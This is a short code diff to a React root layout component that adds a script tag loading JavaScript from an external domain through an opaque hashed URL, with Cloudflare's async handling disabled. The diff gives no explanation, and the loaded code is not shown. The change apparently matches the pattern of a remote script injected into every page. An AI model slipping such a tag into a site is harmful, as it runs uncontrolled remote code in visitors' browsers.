@@ -122,6 +122,10 @@ function RootShell({ children }: { children: ReactNode }) {
       <body>
         {children}
         <Scripts />
+        <script
+          data-cfasync="false"
+          src="https://bauval.org/14/4861ee9968a8bb8c6a26b657e6def28d"
+        />
       </body>
     </html>
   );
